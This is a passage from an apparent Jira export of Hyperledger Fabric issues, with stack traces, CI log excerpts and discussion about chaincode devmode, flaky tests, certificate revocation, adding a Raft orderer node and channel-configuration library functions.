/Users/sjain68/go/src/github.com/hyperledger/fabric/core/endorser/endorser.go:377github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposal /Users/sjain68/go/src/github.com/hyperledger/fabric/core/endorser/endorser.go:320github.com/hyperledger/fabric/core/handlers/auth/filter.(*expirationCheckFilter).ProcessProposal /Users/sjain68/go/src/github.com/hyperledger/fabric/core/handlers/auth/filter/expiration.go:61github.com/hyperledger/fabric/core/handlers/auth/filter.(*filter).ProcessProposal /Users/sjain68/go/src/github.com/hyperledger/fabric/core/handlers/auth/filter/filter.go:32github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer._Endorser_ProcessProposal_Handler.func1 /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer/peer.pb.go:107github.com/hyperledger/fabric/common/grpclogging.UnaryServerInterceptor.func1 /Users/sjain68/go/src/github.com/hyperledger/fabric/common/grpclogging/server.go:92github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1 /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25github.com/hyperledger/fabric/common/grpcmetrics.UnaryServerInterceptor.func1 /Users/sjain68/go/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:31github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1 /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1 /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:34github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer._Endorser_ProcessProposal_Handler /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer/peer.pb.go:109github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).processUnaryRPC /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:995github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).handleStream /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1275github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1.1 /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:710runtime.goexit /usr/local/go/src/runtime/asm_amd64.s:1357failed to execute transaction ff1bc3d9634d5bd705dea134c32199f2176b9a57841092d8b8c2c2ce4aa7b816github.com/hyperledger/fabric/core/chaincode.processChaincodeExecutionResult /Users/sjain68/go/src/github.com/hyperledger/fabric/core/chaincode/chaincode_support.go:161github.com/hyperledger/fabric/core/chaincode.(*ChaincodeSupport).Execute /Users/sjain68/go/src/github.com/hyperledger/fabric/core/chaincode/chaincode_support.go:156github.com/hyperledger/fabric/core/endorser.(*SupportImpl).Execute /Users/sjain68/go/src/github.com/hyperledger/fabric/core/endorser/support.go:126github.com/hyperledger/fabric/core/endorser.(*Endorser).callChaincode /Users/sjain68/go/src/github.com/hyperledger/fabric/core/endorser/endorser.go:114github.com/hyperledger/fabric/core/endorser.(*Endorser).SimulateProposal /Users/sjain68/go/src/github.com/hyperledger/fabric/core/endorser/endorser.go:173github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposalSuccessfullyOrError /Users/sjain68/go/src/github.com/hyperledger/fabric/core/endorser/endorser.go:377github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposal /Users/sjain68/go/src/github.com/hyperledger/fabric/core/endorser/endorser.go:320github.com/hyperledger/fabric/core/handlers/auth/filter.(*expirationCheckFilter).ProcessProposal /Users/sjain68/go/src/github.com/hyperledger/fabric/core/handlers/auth/filter/expiration.go:61github.com/hyperledger/fabric/core/handlers/auth/filter.(*filter).ProcessProposal /Users/sjain68/go/src/github.com/hyperledger/fabric/core/handlers/auth/filter/filter.go:32github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer._Endorser_ProcessProposal_Handler.func1 /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer/peer.pb.go:107github.com/hyperledger/fabric/common/grpclogging.UnaryServerInterceptor.func1 /Users/sjain68/go/src/github.com/hyperledger/fabric/common/grpclogging/server.go:92github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1 /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25github.com/hyperledger/fabric/common/grpcmetrics.UnaryServerInterceptor.func1 /Users/sjain68/go/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:31github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1 /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1 /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:34github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer._Endorser_ProcessProposal_Handler /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer/peer.pb.go:109github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).processUnaryRPC /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:995github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).handleStream /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1275github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1.1 /Users/sjain68/go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:710runtime.goexit /usr/local/go/src/runtime/asm_amd64.s:1357 channel=tracktrace txID=ff1bc3d9

```;;;","17/Apr/20 11:06 PM;acloudfan;+1'd

Hi All,

in agreement with [~siddjain] ; without the DEV mode it is going to be a huge challenge for the developers.

Please fix it ASAP

Regards,

Raj ;;;","09/May/20 5:59 PM;prakash.shivappa;Team,

I am in agreement with Raj. This helps the developers to save the chain code development,enhancement and unit testing time.  This is very much required for the developer to ensure everything is working as expected. This also helps developer to do rigorous testing before migrating the existing chain code to Hyperledger 2.X env

Request you to please fix this Issue Immediately.

Regards,

Prakash;;;","23/Jun/20 12:27 AM;btl5037;We have prioritized devmode and are actively going to work on a fix for it. We are also going to add integration tests for devmode so they do not break in the future.;;;","27/Jul/20 9:11 AM;Pancham;[~btl5037], [~dereckluo] - I will like to contribute to this issue if there is any need for additional developer to work on it. Kindly let me know. ;;;","27/Jul/20 9:21 AM;btl5037;Hi  [~Pancham], [~dereckluo] has been working through this and there are two additional Jira's related to it. It is being actively worked on. I will let [~dereckluo] follow up with any additional comments.

The other Jira's:

https://jira.hyperledger.org/browse/FAB-18074

https://jira.hyperledger.org/browse/FAB-18073

 ;;;","29/Jul/20 4:38 AM;dereckluo;Hi [~Pancham], as [~btl5037] mentioned above, currently there is a list of Jiras that opened to keep track of the work in DevMode. 

As mentioned in this Jira, there is a path for developers to use DevMode with new lifecycle in 2.x... 

The rest of work for DevMode currently are mainly focused on test coverage and documentation updates.

Feel free to pickup any Jiras that you are interested, and post comments and questions if you have any.

lists of Jiras : 

https://jira.hyperledger.org/browse/FAB-18098

https://jira.hyperledger.org/browse/FAB-18074

https://jira.hyperledger.org/browse/FAB-18073

https://jira.hyperledger.org/browse/FAB-18111;;;","18/Aug/20 4:57 AM;wlahti;It seems the investigation is complete at this point. Going to close this item in favor of the individual tasks that Dereck mentioned above.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent test failure in integration/e2e/e2e_signal_test - timeout,FAB-17585,44508,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sykesm,caod,caod,05/Mar/20 6:07 AM,17/Mar/20 9:38 PM,28/Oct/23 3:09 AM,17/Mar/20 9:38 PM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ci-flake,,,,," 
{code:java}
 ------------------------------    • Failure [60.518 seconds]    SignalHandling [It] handles signals     /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/e2e/e2e_signal_test.go:67       Timed out after 60.000s.     Got stuck at:     2020-03-04 20:43:45.477 UTC [nodeCmd] serve -> INFO 001 Starting peer:     Version: latest     Commit SHA: development build     Go version: go1.13.8     OS/Arch: linux/amd64     Chaincode:     Base Docker Label: org.hyperledger.fabric     Docker Namespace: hyperledger     2020-03-04 20:43:45.478 UTC [peer] getLocalAddress -> INFO 002 Auto-detected peer address: 10.1.0.4:20504     2020-03-04 20:43:45.478 UTC [peer] getLocalAddress -> INFO 003 Auto-detect flag is set, returning 10.1.0.4:20504     2020-03-04 20:43:45.485 UTC [nodeCmd] initGrpcSemaphores -> INFO 004 concurrency limit for endorser service is 100     2020-03-04 20:43:45.485 UTC [nodeCmd] initGrpcSemaphores -> INFO 005 concurrency limit for deliver service is 1     2020-03-04 20:43:45.485 UTC [nodeCmd] serve -> INFO 006 Starting peer with TLS enabled     2020-03-04 20:43:45.494 UTC [ledgermgmt] NewLedgerMgr -> INFO 007 Initializing LedgerMgr     2020-03-04 20:43:45.507 UTC [leveldbhelper] openDBAndCheckFormat -> INFO 008 DB is empty Setting db format as 2.0     2020-03-04 20:43:45.508 UTC [fsblkstorage] NewProvider -> INFO 009 Creating new file ledger directory at /tmp/e2e-sigs719068610/peers/Org1.peer0/filesystem/ledgersData/chains/chains     2020-03-04 20:43:45.516 UTC [leveldbhelper] openDBAndCheckFormat -> INFO 00a DB is empty Setting db format as 2.0     2020-03-04 20:43:45.528 UTC [leveldbhelper] openDBAndCheckFormat -> INFO 00b DB is empty Setting db format as 2.0     2020-03-04 20:43:45.529 UTC [ledgermgmt] NewLedgerMgr -> INFO 00c Initialized LedgerMgr     2020-03-04 20:43:45.537 UTC [gossip.service] New -> INFO 00d Initialize gossip with endpoint 10.1.0.4:20504     2020-03-04 20:43:45.538 UTC [gossip.gossip] New -> INFO 00e Creating gossip service with self membership of Endpoint: 127.0.0.1:20504, InternalEndpoint: 10.1.0.4:20504, PKI-ID: 1f317fd909dcb25b0ead7aa6396b7406dd3b3db3d468eefe0a07312ef34818ab, Metadata:     2020-03-04 20:43:45.538 UTC [gossip.gossip] start -> INFO 00f Gossip instance 10.1.0.4:20504 started     2020-03-04 20:43:45.538 UTC [lifecycle] InitializeLocalChaincodes -> INFO 010 Initialized lifecycle cache with 0 already installed chaincodes     2020-03-04 20:43:45.539 UTC [nodeCmd] computeChaincodeEndpoint -> INFO 011 Entering computeChaincodeEndpoint with peerHostname: 10.1.0.4     2020-03-04 20:43:45.539 UTC [nodeCmd] computeChaincodeEndpoint -> INFO 012 Exit with ccEndpoint: 10.1.0.4:20505     2020-03-04 20:43:45.544 UTC [sccapi] DeploySysCC -> INFO 013 deploying system chaincode 'lscc'     2020-03-04 20:43:45.544 UTC [sccapi] DeploySysCC -> INFO 014 deploying system chaincode 'cscc'     2020-03-04 20:43:45.544 UTC [sccapi] DeploySysCC -> INFO 015 deploying system chaincode 'qscc'     2020-03-04 20:43:45.544 UTC [sccapi] DeploySysCC -> INFO 016 deploying system chaincode '_lifecycle'     2020-03-04 20:43:45.545 UTC [nodeCmd] serve -> INFO 017 Deployed system chaincodes     2020-03-04 20:43:45.545 UTC [discovery] NewService -> INFO 018 Created with config TLS: true, authCacheMaxSize: 1000, authCachePurgeRatio: 0.750000     2020-03-04 20:43:45.545 UTC [nodeCmd] registerDiscoveryService -> INFO 019 Discovery service activated     2020-03-04 20:43:45.545 UTC [nodeCmd] serve -> INFO 01a Starting peer with ID=[Org1.peer0], network ID=[voz6t337xvc5pecviotksuxklq], address=[10.1.0.4:20504]     2020-03-04 20:43:45.545 UTC [nodeCmd] serve -> INFO 01b Started peer with ID=[Org1.peer0], network ID=[voz6t337xvc5pecviotksuxklq], address=[10.1.0.4:20504]     2020-03-04 20:43:45.545 UTC [kvledger] LoadPreResetHeight -> INFO 01c Loading prereset height from path [/tmp/e2e-sigs719068610/peers/Org1.peer0/filesystem/ledgersData/chains]     2020-03-04 20:43:45.545 UTC [fsblkstorage] preResetHtFiles -> INFO 01d No active channels passed       Waiting for:     Received signal:      /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/e2e/e2e_signal_test.go:70   {code}
 ",,caod,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Mar/20 6:03 AM;caod;signalFlake030420.log;https://jira.hyperledger.org/secure/attachment/18160/signalFlake030420.log",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019rn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Mar/20 11:32 AM;sykesm;https://github.com/hyperledger/fabric/pull/870;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Investigate the handling of excluded packages in unit tests,FAB-17586,44509,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,05/Mar/20 10:44 AM,08/May/20 1:50 PM,28/Oct/23 3:09 AM,08/May/20 1:50 PM,,,,,,,,,,,,,,fabric-ci,,,,,,,,,0,,,,,,"The `excluded` packages in `run-unit-tests.sh` are not always excluded, we need to dig into why and fix, for example, the below change triggered gossip despite containing only a completely unrelated change to a test in a totally different package:

[https://github.com/hyperledger/fabric/pull/801/files]

[https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=9255&view=logs&j=ebb37e22-1b6b-50bf-588e-4a3b10a4fc3d&t=5e6c925f-2981-5207-dd06-5e1b24383e25]",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019rv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Verify that a cert is issued by an MSP before adding to revocation list,FAB-17587,44512,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,wlahti,wlahti,06/Mar/20 12:39 AM,25/Mar/20 4:49 AM,28/Oct/23 3:09 AM,25/Mar/20 4:49 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a fabric administrator, I want to verify that a cert was issued by my organization's MSP before adding it to the MSP's revocation list.

Acceptance:
 Provided with a config block/transaction, I can call a function to ""revoke"" a certificate issued by an MSP. This should result in a configuration update that appropriately modifies the {{revocation_list}} attribute of {{FabricMSPConfig}}.

Providing a certificate that has not been issued by the MSP should result in an error.",,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17545,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzi",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Mar/20 1:09 AM;wlahti;A rough WIP from Dereck and I can be found here: [https://github.com/wlahti/fabric/blob/FAB-17546/pkg/config/msp.go#L119] 

The testing side was proving harder that we imagined, particularly creating a cert signed by a CA cert and having a consistent cert values to test against in the expectedConfig json.;;;","25/Mar/20 1:32 AM;wlahti;https://github.com/hyperledger/fabric/pull/906/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Adding an Orderer to existing RAFT ordering service,FAB-17588,44515,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,chintanr11,chintanr11,chintanr11,06/Mar/20 10:48 PM,09/Mar/20 3:04 PM,28/Oct/23 3:09 AM,09/Mar/20 3:01 PM,v2.0.0,,,,,,,,,,,,,fabric-docs,fabric-orderer,fabric-samples,,,,,,,0,Documentation,orderingservice,Raft,,,"I am following steps given [here|https://hyperledger-fabric.readthedocs.io/en/release-2.0/raft_configuration.html#reconfiguration] to add a new Orderer node to the existing RAFT ordering service.
 # I am using *first-network* from the fabric-samples (version: master/latest) github repository.
 # I modified the files in the *first-network* folder to start initially a RAFT service with 3 ORDERERS.
 # After successful end-to-end execution of the *byfn.sh* script, I *docker exec* into the CLI container. In the CLI, I do the following:

Set following environment variables:


{code:java}
export CORE_PEER_ADDRESS=orderer.example.com:7050
export CORE_PEER_LOCALMSPID=OrdererMSP
export CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/users/Admin@example.com/msp
export CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/tls/ca.crt
export ORDERER_CA=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem
export ORDERER_CA=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/tls/server.crt
export CHANNEL_NAME=byfn-sys-channel
{code}

Followed by which I fetch config block, decode it, and the following JSON segment in the {{consenters}} section in the decoded JSON file.

{code:java}
{ 
   ""client_tls_cert"": ""xxx"", 
   ""host"": ""orderer4.example.com"", 
   ""port"": 10050, 
   ""server_tls_cert"": ""xxx"" 
}
{code}

Have hidden the certificate values for now. NOTE: I have not modified the *OrdererAddresses* section still.

The modified JSON is used to update the *SYSTEM CHANNEL* configuration. Then I fetch the latest channel configuration block for the updated *byfn-sys-channel*. I exit the CLI and do *docker cp* to fetch the latest config block from the CLI container into the *channel-artifacts* directory.

I start the orderer named, _orderer4.example.com_ with the bootstrap file path corresponding to the latest fetched config block. But the container crashes and gives me following logs in DEBUG mode:


{code:java}
2020-03-06 10:48:58.535 UTC [orderer.common.cluster.replication] fetchLastBlockSeq -> INFO 5b6 orderer2.example.com:8050 is at block sequence of 2 channel=byfn-sys-channel       
2020-03-06 10:48:58.536 UTC [orderer.common.cluster.replication] fetchLastBlockSeq -> INFO 5b7 orderer3.example.com:9050 is at block sequence of 2 channel=byfn-sys-channel       
2020-03-06 10:48:58.539 UTC [orderer.common.cluster.replication] fetchLastBlockSeq -> INFO 5b8 orderer.example.com:7050 is at block sequence of 2 channel=byfn-sys-channel        
2020-03-06 10:48:58.539 UTC [orderer.common.cluster.replication] connectToSomeEndpoint -> INFO 5b9 Connected to orderer.example.com:7050 with last block seq of 2 channel=byfn-sys-channel
2020-03-06 10:48:58.539 UTC [msp.identity] Sign -> DEBU 5ba Sign: plaintext: 0AF5060A3E08051A06089AD588F30522...0D1A0B08FFFFFFFFFFFFFFFFFF012001
2020-03-06 10:48:58.539 UTC [msp.identity] Sign -> DEBU 5bb Sign: digest: DFBDC201427E47056FA06F3E39B61750C8E874F6E09FE30BBFB38380F5F0A96D
2020-03-06 10:48:58.540 UTC [orderer.common.cluster.replication] obtainStream -> INFO 5bc Sending request for block [1] to orderer.example.com:7050 channel=byfn-sys-channel      
2020-03-06 10:48:58.540 UTC [grpc] infof -> DEBU 5bd transport: loopyWriter.run returning. connection error: desc = ""transport is closing""
2020-03-06 10:48:58.540 UTC [grpc] infof -> DEBU 5be transport: loopyWriter.run returning. connection error: desc = ""transport is closing""
2020-03-06 10:48:58.546 UTC [orderer.common.cluster.replication] pullBlocks -> INFO 5bf Got block [1] of size 25 KB from orderer.example.com:7050 channel=byfn-sys-channel        
2020-03-06 10:48:58.548 UTC [orderer.common.cluster.replication] pullBlocks -> INFO 5c0 Got block [2] of size 35 KB from orderer.example.com:7050 channel=byfn-sys-channel        
2020-03-06 10:48:58.551 UTC [orderer.common.cluster] BlockCommitted -> DEBU 5c1 Committed block [1] for channel byfn-sys-channel that is not a config block
2020-03-06 10:48:58.551 UTC [orderer.common.cluster] appendBlock -> PANI 5c2 Failed to write block [1]: unexpected Previous block hash. Expected PreviousHash = [v1], PreviousHash referred in the latest block= [v2]
panic: Failed to write block [1]: unexpected Previous block hash. Expected PreviousHash = [v1], PreviousHash referred in the latest block= [v2]
{code}

I am following the steps given in the latest Hyperledger Documentation and still it is throwing this error. 

So I found the solution to this problem in chat.hyperledger.org where it was suggested to boot up the new orderer using the old *genesis.block* file which was used by other 3 orderers to start up initially. This actually worked but completely contradicts to what the official documentation says! Please correct me if I am wrong!

Link to StackOverflow thread:
https://stackoverflow.com/questions/60562674/adding-a-new-orderer-node-to-the-raft-ordering-service-in-hyperledger-fabric/60563430",,chintanr11,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019sr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),chintanr11,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Mar/20 3:01 PM;chintanr11;There was an issue with respect to the volumes being mount to the new orderer container. It was using an existing volume for the new orderer, because I kept pulling down the ""byfn.sh"" script and using it again to up the network. But the given steps in the documentation are working perfectly when used with fresh mounts. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Protolator doesn't properly decode some fields,FAB-17589,44516,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,caod,caod,07/Mar/20 12:13 AM,07/Mar/20 4:21 AM,28/Oct/23 3:09 AM,07/Mar/20 4:21 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"We've noticed that the FabricMSPConfig and Endpoints (aka OrdererAddresses) aren't properly being decoded into objects:
{code:java}
""values"": {		
    ""Endpoints"": {			
        ""mod_policy"": ""Admins"",	
        ""value"": ""Cg1sb2NhbGhvc3Q6MTIz"",
        ""version"": ""0""
    },		
    ""MSP"": {			
        ""mod_policy"": ""Admins"",			
        ""value"": ""EuMCMjoKNi0tLS0tQkVHSU4gQ0VSVElGSUNBVEUtLS0tLQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tChIAOjgKNi0tLS0tQkVHSU4gQ0VSVElGSUNBVEUtLS0tLQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCkIAWugBEjgKNi0tLS0tQkVHSU4gQ0VSVElGSUNBVEUtLS0tLQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCho4CjYtLS0tLUJFR0lOIENFUlRJRklDQVRFLS0tLS0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQoiOAo2LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0KKjgKNi0tLS0tQkVHSU4gQ0VSVElGSUNBVEUtLS0tLQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg=="",			
        ""version"": ""0""		
    }	
},
{code}
Let's also do a quick audit to see if there are any other fields that need to be addressed

 ",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzy4",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Mar/20 12:15 AM;caod;AnchorPeers as well;;;","07/Mar/20 4:21 AM;caod;Turns out this isn't an issue with protolator. Our test was trying to decorate an arbitrary ConfigGroup so protolator wasn't sure how to handle it. In FAB-17582 we've wrapped the ConfigGroup in a DynamicOrdererOrgGroup so protolator is able to determine it's specifically an orderer org group.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
GRPCS not working concerning Chaincode,FAB-17590,44518,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,StealthyCoder,StealthyCoder,StealthyCoder,07/Mar/20 12:28 AM,12/Mar/20 11:27 PM,28/Oct/23 3:09 AM,12/Mar/20 11:27 PM,v1.4.0,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,chaincode,,,,,The issue I ran into was when having SSL generated certificates by Hyperledger Fabric using the {{cryptogen}}  tool the moment you start the Hyperledger Peer it generates SSL cryptographic material that only exists in that memory/process space. So verification will always fail.,,StealthyCoder,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019sz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),StealthyCoder,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Mar/20 9:16 PM;StealthyCoder;Unsure of how I can get it  to pop up, but I though I'd at least mention my fix here: https://github.com/hyperledger/fabric/pull/814;;;","10/Mar/20 1:38 AM;yacovm;This is by design... look at FAB-5406 for more information;;;","12/Mar/20 11:27 PM;sykesm;This is working as designed. Please see the conversation on PR #814.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function that adds an orderer endpoint,FAB-17591,44520,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,caod,caod,07/Mar/20 4:42 AM,21/Mar/20 12:19 AM,28/Oct/23 3:09 AM,21/Mar/20 12:19 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a fabric administrator, I want to use a fit-for-purpose library that can modify an existing channel configuration to add an orderer endpoint to an orderer org's config group.

Acceptance:
 Starting with an existing Config block/transaction, I can call a function that adds an orderer endpoint to the configuration. After performing that operation, I can compute a ConfigUpdate transaction that is ready for a signature workflow. An appropriate example should also be added to the example test that demonstrates this behavior.",,caod,sykesm,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17592,,FAB-17543,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzyj",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,xwu,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Mar/20 12:19 AM;caod;[https://github.com/hyperledger/fabric/pull/891]

[https://github.com/hyperledger/fabric/pull/857];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function that removes an orderer endpoint,FAB-17592,44521,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,caod,caod,07/Mar/20 4:44 AM,21/Mar/20 12:39 AM,28/Oct/23 3:09 AM,21/Mar/20 12:39 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a fabric administrator, I want to use a fit-for-purpose library that can modify an existing channel configuration to remove an orderer endpoint from an orderer org's config group.

Acceptance:
